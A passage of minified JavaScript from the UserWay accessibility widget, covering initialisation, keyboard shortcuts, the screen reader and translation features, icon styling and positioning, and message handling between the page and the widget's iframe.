  function o() {
    $e = UserWayWidgetApp.getLib("mini-widget"), $e.load().then(function () {
      $e.init();
    });
  }
  function s() {
    Ee(), Y(at), dt.addStyleString(Ut), ie(), ke(), ft.initializeDomChangesObserver(), _t.init(), gt.run(), mt.run(), wt.start(), ve(!0), Ae().then(function () {
      switch (n()) {
        case "nano":
          r();
          break;
        case "mini":
          o();
      }
    });
  }
  function u() {
    var e, t;
    if (i()) return void ie();
    if (!a()) return s();
    y(), g(), w(), p(), m(), Ee(), Y(at), K(at.services.LIVE_TRANSLATIONS, null === (t = null === (e = at.remediation) || void 0 === e ? void 0 : e.commonSettings) || void 0 === t ? void 0 : t.enabled), dt.addStyleString(Ut), Le(Nt), ie(), at.tunings && at.tunings.hasOwnProperty("widget_headless") && !0 === at.tunings.widget_headless && UserWay.iconVisibilityOff(), ye(), P();
    var n = dt.getProperty(at, Mt),
      r = !dt.isMobile() && at.tunings.widget_position_nudge,
      o = dt.isMobile() && at.tunings.widget_position_nudge_mobile;
    if ((r || o) && !n) var u = setInterval(function () {
      document.querySelector(".uai") && (clearInterval(u), fe());
    }, 50);
    k(), ke(), dt.isMobile() || yt.insert(), B(), $(), ae(), te(), Oe(), at.partner === atob("cmFrYmFuaw==") && window.location.pathname === atob("L3dwcy9wb3J0YWwvUHJlcGFpZENhcmRTZWxmQ2FyZQ==") && document.querySelector("#keyboard").setAttribute("data-uw-ignore-translate", !0), ft.initializeDomChangesObserver(), _t.init(), gt.run(), mt.run(), wt.start(), ve(!0);
  }
  function l() {
    if (!window._userway) {
      window._userway = !0;
      try {
        localStorage && "function" == typeof localStorage.getItem && localStorage.getItem("debug") && "undefined" !== localStorage.getItem("debug") && JSON.parse(localStorage.getItem("debug")) && X();
      } catch (e) {}
      be(), G(function () {
        if (t()) return console.warn("UserWay Accessibility widget is deactivated");
        if (dt.isMobile() && at.tunings && ("false" === at.tunings.mobile || !1 === at.tunings.mobile)) console.warn("UserWay Accessibility widget is disabled on mobile devices via tunings setting");else var e = setInterval(function () {
          document.body && (clearInterval(e), u());
        }, 500);
      });
    }
  }
  function d() {
    return !!dt.getCookie("hidewidget");
  }
  function c() {
    return at && at.tunings && at.tunings.hasOwnProperty("widget_sounds") && at.tunings.widget_sounds;
  }
  function p() {
    window.addEventListener("keydown", f, !0);
  }
  function f(e) {
    "Tab" !== e.key && 9 !== e.keyCode && "ArrowDown" !== e.key || UserWayWidgetApp.ContextHolder.config.services.paidAi && UserWayWidgetApp.ContextHolder.remediationModulePromise.then(function () {
      window.removeEventListener("keydown", f, !0), window.postMessage({
        isUserWay: !0,
        action: "remediation",
        type: "app-key-nav-enabled"
      }, "*"), document.querySelector("html").setAttribute("data-uw-w-kb", "");
    });
  }
  function y() {
    window.addEventListener("keydown", x, !0);
  }
  function g() {
    var e = at.services.paidAi || !at.services.hasOwnProperty("paidAi"),
      t = at.services.hasOwnProperty("MODIFY_MENU") && at.services.MODIFY_MENU.is_enabled,
      i = !t || -1 !== at.services.MODIFY_MENU.features_pattern.split("|").indexOf("s9");
    e && i && ht.isAvailable({
      pageLanguage: at.widgetPageLang,
      widgetLanguage: at.language
    }) && window.addEventListener("keydown", L, !0);
  }
  function w() {
    window.addEventListener("keydown", E, !0);
  }
  function m() {
    var e = at.services.hasOwnProperty("MODIFY_MENU") && at.services.MODIFY_MENU.is_enabled,
      t = at.services.hasOwnProperty("VOICE_NAVIGATION") && at.services.VOICE_NAVIGATION.is_enabled,
      i = !!window.chrome,
      n = Boolean(navigator.userAgent.match(/safari/i));
    (i || n) && t && (!e || !at.services.MODIFY_MENU.features_pattern.split("|").includes("s24")) && window.addEventListener("keydown", S, !0);
  }
  function h() {
    var e = document.querySelector(".uai");
    ["top", "bottom", "left", "right"].forEach(function (t) {
      e.style.setProperty([t], null, "important");
    });
  }
  function b() {
    if (!Dt) {
      Dt = !0;
      var e = function (e) {
        var t = e.data || {};
        if (t.isUserWay) if ("appConfigLoaded" === t.action) qt || (M("hide"), qt = !0), !rt && st && (ue(), M("hide")), rt = !1;else if ("mailToSupport" === t.action) window.open("mailto:support@userway.org", "_blank");else if ("download_pdf" === t.action) dt.downloadFile(t.url);else if ("AiPageReload" === t.action) document.location.reload();else if ("openExternalLink" === t.action) {
          try {
            new URL(t.url);
          } catch (e) {
            return;
          }
          window.open(t.url, "_blank");
        } else if ("getConfig" === t.action) T();else if ("isWidgetOpened" === t.action) st ? dt.postMessage({
          action: "toggled",
          state: "show"
        }) : dt.postMessage({
          action: "toggled",
          state: "hide"
        });else if ("close" === t.action) ce();else if ("open" === t.action) de();else if ("manageIconVisibility" === t.action) re(t.type);else if ("manageIconVisibility" === t.action) re(t.type);else if ("default_language_changed" === t.action) window.localStorage.removeItem("userway-selectedLang"), window.localStorage.removeItem("userway-selectedSiteLang");else if ("on_demand_reader" === t.action) {
          if (t.contentToRead && (at.services.paidAi || !at.services.hasOwnProperty("paidAi"))) {
            var i = t.menuLanguage;
            t.contentWithPageLang && (i = bt.resolvePageLangAttribute()), Ne.readTextContent({
              language: i,
              contentToRead: t.contentToRead,
              isAlert: t.isAlert,
              readingSpeedRate: t.readingSpeedRate
            });
          }
        } else if ("on_demand_reader_stop" === t.action) Ne.stopReading();else if ("setProperties" === t.action) {
          for (var n in t.settings) t.settings.hasOwnProperty(n) && void 0 !== at.settings[n] && "userway_hidden" !== n && (at.settings[n].value = t.settings[n].value);
          var a = ["s101", "s102", "s103", "s104", "s105", "s106", "s107", "s108"],
            r = at.services.hasOwnProperty("MODIFY_MENU") && at.services.MODIFY_MENU.is_enabled;
          r && t.pattern && (at.services.MODIFY_MENU.features_pattern = t.pattern.filter(function (e) {
            return -1 === a.indexOf(e);
          }).join("|")), he(), ve();
        } else if ("pageStructureDialog" === t.action) {
          var o = t.settings.tab || "headers";
          "links" === o ? ze.showPageStructureLinks() : "landmarks" === o ? ze.showPageStructureLandmarks() : ze.showPageStructureHeaders();
        } else if ("setWidgetColor" === t.action) at.tunings.widget_color = t.color, at.tunings.widget_color_gradient = t.gradient, k(), B();else if ("setIconType" === t.action) at.tunings.widget_icon_type = t.iconType, k();else if ("setSoundEffects" === t.action) at.tunings.widget_sounds = t.value;else if ("isVisibleOnMobile" === t.action) at.tunings.widget_hidden_for_mobile = t.value;else if ("setIconSize" === t.action) at.tunings.widget_icon_size = t.iconSize, k();else if ("setWidgetLanguage" === t.action) Ie("enable", "LIVE_TRANSLATIONS"), j(t.langCode), setTimeout(function () {
          O(), W();
        }), yt.updateLinks();else if ("loadLiveTranslationComponent" === t.action) K({
          is_enabled: !0
        }, !1);else if ("websiteTranslationCompleted" === t.action || "websiteTranslationReverted" === t.action) Ue("enable", "LIVE_TRANSLATIONS"), setTimeout(function () {
          O(), P();
        });else if ("setWidgetPosition" === t.action) t.byUser || (t.isMobile ? dt.removeProperty(at, Pt) : dt.removeProperty(at, Mt)), t.byMoveHideSection || (at.tunings.widget_position = t.position), ye(t.byUser ? t.position : null, !!t.isMobile && t.isMobile, t.byMoveHideSection), !dt.isMobile() && t.widget_position_nudge || dt.isMobile() && t.widget_position_nudge_mobile ? fe(t) : h(), k();else if ("setTimeHideWidget" === t.action) we(t.value);else if ("location_request" === t.action) dt.postMessage({
          action: "location_response",
          location: {
            hash: location.hash,
            host: location.host,
            hostname: location.hostname,
            href: location.href,
            origin: location.origin,
            pathname: location.pathname,
            port: location.port,
            protocol: location.protocol
          }
        });else if ("setReaderGuidePosition" === t.action) {
          var s = t.value;
          if (Pe) {
            var u = "ie" === at.browser ? window.pageYOffset || document.documentElement.scrollTop : window.scrollY;
            s.yPos = s.yPos + u, Pe.setRulerElPosition(s);
          }
        } else if ("custom_trigger_update" === t.action) {
          at.tunings.widget_custom_trigger = t.data.selector, at.tunings.widget_custom_trigger_enabled = t.data.enabled;
          var l = [].slice.call(document.querySelectorAll('[data-uw-trigger="true"]'));
          l.forEach(function (e) {
            e.removeEventListener("click", J), e.removeEventListener("keypress", Z), e.removeAttribute("data-uw-trigger");
          });
          var d = We();
          d && d.length ? (window.UserWay.iconVisibilityOff(), Q()) : window.UserWay.iconVisibilityOn();
        } else "on_demand_reader_preload" === t.action ? (Ie("preload", "userway-s9"), Ne.preload().then(function () {
          return Ue("preload", "userway-s9");
        })) : "closeVoiceNavigation" === t.action && (me("s24", 0), dt.postMessage({
          action: "closeVoiceNavigation"
        }));
      };
      dt.registerPostMessageListener(e);
    }
  }
  function _() {
    document.querySelectorAll("body > *:not(script):not(.uwy)").forEach(function (e) {
      e.setAttribute("inert", "");
    });
  }
  function v() {
    document.querySelectorAll("*[inert]").forEach(function (e) {
      e.removeAttribute("inert");
    });
  }
  function x(e) {
    vt.isHotkeyToOpenWidget(e) && (e.preventDefault(), d() ? (dt.setCookie("hidewidget", "", null), window.location.reload()) : de());
  }
  function E(e) {
    "Space" !== e.keyCode && 32 !== e.which || !e.ctrlKey || UserWay.resetAll();
  }
  function L(e) {
    if (("Period" === e.code || "." === e.key) && e.ctrlKey && at.reader.enabled) {
      var t = window.localStorage.getItem("readerSpeed") ? window.localStorage.getItem("readerSpeed") : 1;
      t = parseInt(t, 10), A(t), at.settings["userway-s9"].value ? UserWay.readPageDisable() : UserWay.readPageEnable(t), dt.postMessage({
        action: "toggleReader"
      });
    }
  }
  function S(e) {
    var t, i;
    if (("Comma" === e.code || "," === e.key) && e.ctrlKey) {
      var n = 1 === (null === (i = null === (t = null === at || void 0 === at ? void 0 : at.settings) || void 0 === t ? void 0 : t["userway-s24"]) || void 0 === i ? void 0 : i.value);
      Ae().then(function () {
        me("s24", n ? 0 : 1), dt.postMessage({
          action: n ? "closeVoiceNavigation" : "openVoiceNavigation"
        });
      });
    }
  }
  function A(e) {
    var t = setInterval(function () {
      if (window.responsiveVoiceLocales) {
        var i = window.responsiveVoiceLocales[at.language].widget.responsive_voice,
          n = at.settings["userway-s9"].value ? Ce() ? i.enabled_wl : i.enabled : Ce() ? i.disabledScreenReader_wl : i.disabledScreenReader;
        Ne.readTextContent({
          language: at.language,
          contentToRead: n,
          isAlert: !1,
          readingSpeedRate: e
        }), clearInterval(t);
      }
    }, 50);
  }
  function T() {
    dt.postMessage({
      action: "sendConfig",
      config: at
    });
  }
  function k() {
    var e = "" + F(),
      t = R();
    I(e, t), C(e, t), W();
  }
  function W() {
    if (UserWayWidgetApp.lazyLoaded) {
      var e = document.querySelector(".usr");
      if (!document.querySelector("img.check_on")) {
        var t = document.createElement("IMG");
        t.classList.add("check_on"), t.setAttribute("data-uw-rm-ignore", ""), t.width = 18, t.height = 20, t.alt = "Accessibility menu is on", e.parentNode.insertBefore(t, e.nextSibling), N(t, "check_on.svg");
      }
    }
  }
  function O() {
    var e = function () {
        var e = Xe.getIsoByLangCode(i),
          t = Xe.getNameByLangCode(i),
          n = document.querySelector(".usr"),
          a = document.createElement("div");
        a.classList.add("uwaw-lang-list__circle", "uwaw-lang-list__circle-" + e), a.setAttribute("data-uw-rm-ignore", ""), a.setAttribute("data-uw-ignore-translate", !0), a.setAttribute("title", "Auto Translation enabled: " + t), a.textContent += e, n.parentNode.insertBefore(a, n.nextSibling);
      },
      t = UserWayWidgetApp.getLib("LIVE_TRANSLATIONS");
    if (t && t.getCurrentLanguage) {
      var i = t.getCurrentLanguage(),
        n = document.querySelector("div.uwaw-lang-list__circle");
      n && n.parentNode.removeChild(n), i && Promise.all([function () {
        return Xe ? Promise.resolve(!0) : dt.execJs(Lt + "frontend/javascripts/languages.js?v=1701163069272", "sha256-p/alu9JH1ZbycQOR9RSV+XgfdFcvZbl7W2VfsSBMZ/8=").then(function () {
          return Xe = UserWayWidgetApp.getLib("LANGUAGES"), !0;
        }).catch(function () {
          return !1;
        });
      }(), function () {
        return Vt ? Promise.resolve(!0) : dt.addStylesheet(Lt + "frontend/stylesheets/flags.css?v=1701163069272").then(function () {
          return Vt = !0;
        }).catch(function () {
          return !1;
        });
      }()]).then(function (t) {
        var i = __read(t, 2),
          n = i[0],
          a = i[1];
        return n && a && e();
      });
    }
  }
  function C(e, t) {
    var i = document.querySelector(".ups");
    if (i) {
      i.innerHTML = '<img width="43" height="43" data-uw-rm-ignore="" class="' + (t.isLight ? "si_b" : "si_w") + '" aria-hidden="true" alt="Spinner: ' + (t.isLight ? "Black" : "White") + ' decorative" src="" />';
      var n = document.querySelector("img.si_w");
      U(t, document.querySelector("img.si_b"), n, "spin");
    }
  }
  function I(e, t) {
    var i = document.querySelector("div.uwy"),
      n = "" + (_userway_config.type || at.tunings.widget_icon_type || Et.UW_WIDGET_ICON_TYPE),
      a = "" + D(),
      r = -1 !== ["4", "5", "6", "7"].indexOf(e),
      o = document.querySelector(".uiiw");
    if ("4" !== n) i.classList.contains("uac") && i.classList.remove("uac"), o.innerHTML = '<img width="43" height="43" data-uw-rm-ignore="" class="' + (t.isLight ? "ui_b" : "ui_w") + '" role="presentation" alt="" src="" />';else {
      dt.addUwStylesheetMetropolisFont(at), i.classList.add("uac");
      var s = ct.translate,
        u = s(at.language, "widget.text_icon_small"),
        l = s(at.language, "widget.text_icon_large"),
        d = "large" !== a || dt.isMobile() ? u : l;
      o.innerHTML = '<div class="accessibility-btn"><span style="font-family: Metropolis, sans-serif!important;" class="accessibility-btn__text">' + d + "</span></div>";
    }
    var c = document.querySelector("img.ui_w"),
      p = document.querySelector("img.ui_b");
    switch (n) {
      case "1":
        U(t, p, c, "body"), p && p.setAttribute("alt", ""), c && c.setAttribute("alt", "");
        break;
      case "2":
        r ? U(t, p, c, "wheel_right") : U(t, p, c, "wheel_left"), p && p.setAttribute("alt", ""), c && c.setAttribute("alt", "");
        break;
      case "3":
        U(t, p, c, "eye"), p && p.setAttribute("alt", ""), c && c.setAttribute("alt", "");
        break;
      case "4":
        break;
      default:
        U(t, p, c, "body"), p && p.setAttribute("alt", ""), c && c.setAttribute("alt", "");
    }
    "large" !== a || dt.isMobile() ? i.classList.remove("utb") : i.classList.add("utb");
  }
  function U(e, t, i, n) {
    e && e.isLight ? N(t, n + "_bl.svg") : N(i, n + "_wh.svg");
  }
  function N(e, t) {
    e.setAttribute("src", at.cdn + "widgetapp/images/" + t);
  }
  function M(e) {
    e = void 0 === e ? "toggle" : e;
    var t = document.querySelector(".uai");
    "show" === e ? t.classList.add("loading") : "hide" === e ? t.classList.remove("loading") : "toggle" === e && t.classList.toggle("loading");
  }
  function P() {
    var e = document.querySelector(".uai"),
      t = document.querySelector(".uwif"),
      i = at.services && (at.services.CUSTOM_BRANDING || at.services.WHITE_LABEL);
    e.setAttribute("aria-label", dt.getUserWayIconElementTitle(at)), t.setAttribute("title", i ? dt.getUserWayIconElementTitle(at) : "UserWay " + dt.getUserWayIconElementTitle(at));
  }
  function R() {
    var e = {
        color: Et.UW_WIDGET_COLOR,
        gradient: null,
        isLight: !1
      },
      t = at.color || at.tunings.widget_color;
    if (t) {
      var i = dt.hexToRgb(t.replace("#", ""));
      e.isLight = dt.colourIsLight(i[0], i[1], i[2]), e.color = t;
    }
    (at.color || at.tunings.widget_color_gradient && at.tunings.widget_color_gradient === Et.UW_WIDGET_COLOR_GRADIENT) && (at.tunings.widget_color_gradient = null);
    var n = at.color_gradient || at.tunings.widget_color_gradient;
    return n && (e.gradient = n), e;
  }
  function F() {
    var e = dt.getProperty(at, Mt);
    if (e) return at.userSpecificPosition = e, e;
    var t = at.tunings.widget_position;
    return dt.isMobile() && at.tunings.widget_position_mobile && (t = at.tunings.widget_position_mobile), "shortpoint" === at.services.partner ? at.position || t || "3" : _userway_config.position || at.position || t || Et.UW_BUTTON_POSITION;
  }
  function D() {
    return _userway_config.size || at.size || at.tunings.widget_icon_size || Et.UW_WIDGET_ICON_SIZE;
  }
  function H() {
    var e = R();
    if (e) {
      var t = document.querySelector(".uw-popup-header"),
        i = document.querySelector(".uw-popup-header-text"),
        n = t.querySelector(".uw-popup-header-close-path"),
        a = e.gradient || e.color,
        r = e.isLight ? "#000000" : "#ffffff";
      t && (t.setAttribute("style", "background: " + a + "!important; color:" + r + "!important"), i.setAttribute("style", "color:" + r + "!important")), n && n.setAttribute("style", "stroke: " + r + "!important");
    }
  }
  function B() {
    var e = document.querySelector(".uai"),
      t = R(),
      i = t.gradient || t.color;
    if (i) {
      if (e) {
        var n = i;
        if ("ie" === dt.detectBrowser()) {
          var a = "" + (_userway_config.type || at.tunings.widget_icon_type || Et.UW_WIDGET_ICON_TYPE);
          4 !== a && "4" !== a || (n += ";min-width:auto!important;max-width:none!important;min-height:auto!important;max-height:none;!important");
        }
        e.style.setProperty("background", n, "important"), t.isLight ? (e.classList.add("uli"), e.classList.remove("userway_dark")) : (e.classList.remove("uli"), e.classList.add("userway_dark"));
      }
      var r = document.querySelector(".userway_hide_on");
      r && r.style.setProperty("background", t.color, "important");
      var o = document.querySelector(".userway_hide_off");
      o && o.style.setProperty("background", t.color, "important");
      var s = document.querySelector(".uhi span");
      s && s.style.setProperty("background", t.color, "important");
    } else e.classList.add("userway_dark");
    dt.postMessage({
      action: "setWidgetColour",
      payload: t || null
    });
  }
  function z() {
    var e = "fo" === at.language && at.partner !== atob("ZmFyb2U=");
    !ht.isAvailable({
      pageLanguage: at.widgetPageLang,
      widgetLanguage: at.language
    }) || e ? V() : q();
  }
  function q() {
    at.reader.enabled = !0, dt.postMessage({
      action: "screen_reader_available"
    });
  }
  function V() {
    Ne.disable(), at.reader.enabled = !1, dt.postMessage({
      action: "screen_reader_not_available"
    });
  }
  function j(e, t) {
    void 0 === t && (t = !1), e && (t || dt.setProperty(at, Rt, e), at.tunings.widget_language = e, at.language = e, rt = !0, Je.updateDictionaryConfigs(), t && se(e), z(), "fo" === at.language && at.partner !== atob("ZmFyb2U=") && V(), ct.initializeLocale(e).finally(function () {
      var t = document.querySelector("div.uwy");
      dt.postMessage({
        action: "setHtmlLangAttribute",
        lang: e
      });
      var i = {
        "en-US": "Our site is built for you; use it in a way that works best for you",
        ar: "تم تصميم موقعنا من أجلك. استخدمه بطريقة تناسبك بشكل أفضل"
      };
      t.setAttribute("title", location.hostname === atob("cmV2YW1wLnJha2JhbmsuYWU=") ? i[at.language] : dt.getUserWayIconElementTitle(at));
    }));
  }
  function G(e) {
    var t,
      i = null;
    _userway_config && _userway_config.platform ? i = _userway_config.platform : window._userway_config && window._userway_config.platform && (i = window._userway_config.platform);
    var n = window.location.origin,
      a = document.referrer;
    if (!n || "null" === n) {
      n = "https://inspect.userway.org";
      try {
        a = window.top.location.href;
      } catch (e) {}
    }
    var r = {
      settings: at.settings,
      origin: n,
      referrer: a,
      base: at.base,
      pageUrl: window.location.href,
      version: St
    };
    i && (r.platform = i), (null === (t = null === at || void 0 === at ? void 0 : at._userway_config) || void 0 === t ? void 0 : t.platfAppInstalledSiteId) && (r.platfAppInstalledSiteId = at._userway_config.platfAppInstalledSiteId), at && (at.account || at.code) || (console.warn("Widget initialization error: no account/code provided. Default code will be used"), at.account = "qLb3sVM6fr", at.defaultAccountUsed = !0);
    var o = new XMLHttpRequest();
    o.open("post", It + "/tunings/" + (at.account || at.code)), o.setRequestHeader("Content-Type", "text/plain;charset=UTF-8"), o.onload = function () {
      try {
        if (503 === o.status) throw new Error("Error 503");
        if (502 === o.status) throw new Error("Error 502");
        if (200 !== o.status) throw new Error("Not 200 status");
        var t = JSON.parse(o.response);
        if (200 !== t.code) return void console.error("Initialization error: " + t.code + " - " + t.message);
        at.cpr = t.data.cpr, at.tunings = t.data.tunings, at.services = t.data.services, at.cpr = t.data.cpr, at.partner = t.data.services && t.data.services.partner ? t.data.services.partner : null, at.widgetPageLang = bt.resolvePageLangAttribute(), at.languageHardcoded = bt.resolveOwnerLangHardcoded();
        var i = t.data.tunings.widget_language && "null" !== t.data.tunings.widget_language && "auto" !== t.data.tunings.widget_language ? t.data.tunings.widget_language : null;
        at.language = bt.resolve({
          ownerLangSelection: i
        }), bt.userLandSelectionIsDefaultLangSelected({
          ownerLangSelection: i
        }) && dt.removeProperty(at, Rt), function () {
          at.remediation = t.data.remediationV2, at.imageAlt = t.data.imageAlt, jt.forEach(function (e) {
            var t = at.tunings[e];
            at.tunings[e] = t ? JSON.parse(t) : null;
          }), UserWayWidgetApp.ContextHolder.config = at;
        }(), ct.initializeLocale(at.language).then(function () {
          var e = !!at.widgetPageLang && ht.isAvailable({
            pageLanguage: at.widgetPageLang,
            widgetLanguage: at.language
          });
          at.reader = {
            enabled: e
          };
        });
      } catch (e) {
        console.error(e);
      }
      e && e();
    }, o.onerror = function (e) {
      console.error(e);
    }, o.onabort = function (e) {
      console.error(e);
    }, o.send(JSON.stringify(r));
  }
  function Y(e) {
    var t = e.remediation;
    t || dt.fireUserWayRemediationCompletedEvent({
      enabled: !1
    });
    var i = e.services && e.services.paidAi,
      n = null,
      a = null;
    t && t.commonSettings.enabled ? (n = At, a = "sha256-dimlq4jYXe/kMfpOpFCmAlSbDXkkq4ZPY/ozpd+geZk=") : i && (n = Wt, a = "sha256-Gi/COb3B0Vu/6dREh4ssJaS9myfhOhnbIITyhdh9Vso="), n && (UserWayWidgetApp.ContextHolder.remediationModulePromise = dt.execJs(Lt + n, a), UserWayWidgetApp.addLib("remediationConfig", t), UserWayWidgetApp.ContextHolder.remediationResources = null), t && !t.commonSettings.enabled || (e.services.editorBuildUrl = Lt + Ot, n ? UserWayWidgetApp.ContextHolder.remediationModulePromise.then(function () {
      dt.execJs(Lt + Tt, "sha256-rxkQBFxaqm28FnkfStfkz/dUYwfiCB0/XthnQjH9XoE=");
    }) : dt.execJs(Lt + kt, "sha256-rsWV6kosbfZaq8kO/efwLH2SVu6V2nAlN7R3F/Bwi3s="), (null === t || void 0 === t ? void 0 : t.consolidated) && dt.request({
      method: "GET",
      url: t.consolidated
    }).then(function (e) {
      e && e.response && (UserWayWidgetApp.ContextHolder.remediationResources = JSON.parse(e.response));
    }, function (e) {
      console.warn("Can't load remediation resources.");
    }));
  }
  function K(e, t) {
    e && e.is_enabled && (Ie("enable", "LIVE_TRANSLATIONS"), dt.execJs(Lt + "widgetapp/2023-11-28-09-17-49/translations/live_translations_1701163069272.js", "sha256-m3WAcdeX+keldlpsxHR5/SLf4YL/t+efOCkBgrSKa1A=").then(function () {
      var e = UserWayWidgetApp.getLib("LIVE_TRANSLATIONS"),
        i = function () {
          return e.awaitForResources();
        };
      return new Promise(function (e) {
        var n = function (t) {
          Ue("enable", "LIVE_TRANSLATIONS"), e(t);
        };
        t ? document.addEventListener(dt.LIFE_CYCLE_EVENT.REMEDIATION, function () {
          return i().then(n);
        }, {
          once: !0
        }) : i().then(n);
      });
    }).then(function (e) {
      e && O();
    }));
  }
  function X() {
    dt.execJs(Lt + "widgetapp/2023-11-28-09-17-49/performance/performance_1701163069272.js").then(function () {
      var e = UserWayWidgetApp.getLib("performance_logger");
      tt = e.getInstance("Features");
    });
  }
  function J() {
    window.UserWay.widgetToggle();
  }
  function Z(e) {
    window.UserWay.widgetToggle(), "Enter" === e.key && (e.preventDefault(), window.UserWay.widgetToggle());
  }
  function Q() {
    var e = We();
    e.length && e.forEach(function (e) {
      e.hasAttribute("data-uw-trigger") || (e.addEventListener("click", J), e.addEventListener("keypress", Z), e.setAttribute("data-uw-trigger", !0));
    });
  }
  function $() {
    Q(), ee();
    var e = document.querySelector("body"),
      t = document.querySelector(".uai"),
      i = document.querySelector(".uwy");
    e && e.addEventListener("touchstart", function (e) {
      for (var t = !1, n = e.target; n;) {
        if (n.classList && n.classList.contains("uai")) {
          t = !0;
          break;
        }
        n = n.parentNode;
      }
      t || i.classList.remove("uo");
    }, !!dt.supportsPassive && {
      passive: !0
    });
    var n = !1;
    at.isMobile && t.addEventListener("touchstart", function (e) {
      n || (e.stopPropagation(), e.preventDefault(), n = !0, setTimeout(function () {
        n = !1;
      }, 400), e.target && "function" == typeof e.target.closest && e.target.closest(".uwaw-dictionary-tooltip") || (oe(), setTimeout(function () {
        i.classList.add("uo");
      }, 50)));
    }, {
      passive: !1
    }), !at.isMobile && t.addEventListener("click", function (e) {
      n || e.target && "function" == typeof e.target.closest && e.target.closest(".uwaw-dictionary-tooltip") || oe();
    }), t.addEventListener("keydown", function (e) {
      32 !== e.keyCode && 13 !== e.keyCode || oe();
    }), t.addEventListener("keyup", function (e) {
      27 === e.keyCode && ce();
    }), t.addEventListener("focus", function () {
      Te();
    }), t.addEventListener("mouseover", function () {
      at.isMobile || (clearTimeout(Kt), Kt = setTimeout(function () {
        i.classList.add("uo");
      }, 100), Te());
    }), t.addEventListener("mouseout", function () {
      at.isMobile || (clearTimeout(Kt), Kt = setTimeout(function () {
        i.classList.remove("uo");
      }, 100));
    });
  }
  function ee() {
    new MutationObserver(function (e) {
      return e.forEach(function (e) {
        "lang" === e.attributeName && z();
      });
    }).observe(document.querySelector("html"), {
      attributes: !0
    });
  }
  function te() {
    dt.fireUserWayLifeCycleEvent(dt.LIFE_CYCLE_EVENT.RENDER);
  }
  function ie() {
    try {
      var e = !!UserWayWidgetApp.ContextHolder && !!UserWayWidgetApp.ContextHolder.config && !!UserWayWidgetApp.ContextHolder.config.remediation;
      dt.fireUserWayLifeCycleEvent(dt.LIFE_CYCLE_EVENT.INIT, {
        remediationEnabled: e
      }), e || dt.fireUserWayRemediationCompletedEvent({
        enabled: !1
      });
    } catch (e) {}
  }
  function ne(e, t, i) {
    void 0 === i && (i = null);
    var n = i ? {
      state: i
    } : null;
    dt.fireUserWayLifeCycleEvent(e + t, n);
  }
  function ae() {
    try {
      var e = window.location.hash.substr(1);
      if (e && e.toLowerCase() === xt || _userway_config.forceOpen) return location.hash = xt, de();
      if (new RegExp("[?&]" + xt, "i").test(window.location.search)) return de();
    } catch (e) {}
  }
  function re(e) {
    try {
      var t = document.querySelector("div.uai");
      if (!t) return console.warn("Icon not found");
      e ? "visible" === e ? t.classList.remove("hidden") : t.classList.add("hidden") : t.classList.contains("hidden") ? t.classList.remove("hidden") : t.classList.add("hidden");
    } catch (e) {}
  }
  function oe() {
    st ? ce() : de();
  }
  function se(e) {
    var t = document.querySelector(".uwif");
    if (!rt || t.src) {
      var i = function (e, t) {
          var i = t,
            n = e;
          i[n];
          return __rest(i, ["symbol" == typeof n ? n : n + ""]);
        },
        n = function (e, t) {
          var n = t;
          return "object" == typeof t && null !== t && (n = e.reduce(function (e, t) {
            return i(t, e);
          }, t)), encodeURIComponent(JSON.stringify(n));
        },
        a = "rand=" + +new Date(),
        r = ["services", "tunings", "language", "account", "widgetPageLang"],
        o = ["accessibility_url", "accessibility_link_enabled", "accessibility_link_text", "CUSTOM_BRANDING", "VOICE_NAVIGATION"],
        s = r.map(function (e) {
          var t = UserWayWidgetApp.ContextHolder.config[e];
          return t ? e + "=" + n(o, t) : null;
        }).filter(Boolean),
        u = __spreadArray([a], __read(s), !1).join("&");
      t.setAttribute("src", Ct + e + "/index.html?" + u);
    }
    rt = !1;
  }
  function ue() {
    var e = document.querySelector(".uwy");
    e.classList.add("uon"), e.classList.remove("hidden");
    var t = document.querySelector(".uwif");
    t.removeAttribute("aria-hidden"), t.removeAttribute("tabindex");
  }
  function le() {
    var e = document.querySelector(".uwy");
    e.classList.remove("uon");
    var t = document.querySelector(".uwif");
    t.setAttribute("aria-hidden", "true"), t.setAttribute("tabindex", "-1");
    var i = e.querySelector("#userwayAccessibilityIcon");
    (document.querySelector("[data-uw-trigger]") || i || window).focus();
  }
  function de() {
    if (window.location.origin && "null" !== window.location.origin) {
      b(), _();
      try {
        if (c()) {
          var e = new Audio(at.cdn + "widgetapp/sounds/widgetOpened.mp3");
          Ft = new Audio(at.cdn + "widgetapp/sounds/widgetClosed.mp3"), e.play();
        }
      } catch (e) {}
      var t = document.querySelector(".uwif");
      t.hasAttribute("src") && qt || M("show"), Promise.resolve().then(function () {
        return t.hasAttribute("src") ? ue() : Ae().then(function () {
          ot = bt.resolveUserLangSelection(), ot && at.language !== ot && (at.language = ot), se(at.language);
        });
      }).then(function () {
        try {
          dt.postMessageWithNotification({
            action: "toggled",
            state: "show"
          }, "widgetOpened", function () {
            st = !0, ue();
          });
        } catch (e) {
          console.error(e);
        }
        z(), qe && qe.hideActiveTooltip && qe.hideActiveTooltip();
      });
    }
  }
  function ce() {
    if (c()) try {
      Ft.play();
    } catch (e) {}
    v();
    var e = UserWayWidgetApp.getLib("remediation_utils");
    "object" == typeof e && "function" == typeof e.highlightElements && e.highlightElements();
    try {
      dt.postMessageWithNotification({
        action: "toggled",
        state: "hide"
      }, "widgetClosed", function () {
        st = !1, Me.onWidgetClosed(), le();
      });
    } catch (e) {
      console.error(e);
    }
  }
  function pe(e, t) {
    var i = new RegExp("\\b" + t + ".*?\\b", "g");
    return e.className = e.className.replace(i, ""), e;
  }
  function fe(e) {
    void 0 === e && (e = at.tunings);
    var t = dt.isMobile(),
      i = document.querySelector(".uai"),
      n = t && e.widget_position_nudge_mobile ? e.widget_position_nudge_mobile.moveX : e.widget_position_nudge.moveX,
      a = t && e.widget_position_nudge_mobile ? e.widget_position_nudge_mobile.moveY : e.widget_position_nudge.moveY,
      r = t && e.widget_position_nudge_mobile ? e.widget_position_nudge_mobile.xOrientation : e.widget_position_nudge.xOrientation,
      o = t && e.widget_position_nudge_mobile ? e.widget_position_nudge_mobile.yOrientation : e.widget_position_nudge.yOrientation,
      s = t ? !e.position_mobile && e.widget_position_mobile ? parseInt(e.widget_position_mobile, 10) : parseInt(e.position, 10) : !e.position && e.widget_position ? parseInt(e.widget_position, 10) : parseInt(e.position, 10);
    if (h(), n) if (-1 !== [1, 2, 3].indexOf(s)) "right" === r && (n = -n), i.style.setProperty("left", "calc(100vw - " + (Gt.leftRightSide.right + n) + "px)", "important");else if (-1 !== [4, 8].indexOf(s)) {
      var u = "left" === r ? " - " : " + ";
      i.style.setProperty("left", "calc(" + Gt.middle.left + "%" + u + n + "px)", "important");
